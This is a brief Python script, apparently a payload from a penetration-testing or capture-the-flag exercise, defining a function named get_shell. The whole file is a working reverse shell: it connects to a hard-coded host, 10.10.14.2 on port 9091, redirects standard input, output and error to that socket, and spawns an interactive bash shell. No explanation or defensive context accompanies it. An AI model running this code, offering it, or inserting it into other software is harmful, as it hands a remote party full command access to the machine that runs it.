import socket
import subprocess
import os
import pty

def get_shell():
    HOST = "10.10.14.2"
    PORT = 9091

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)

    pty.spawn("/bin/bash")
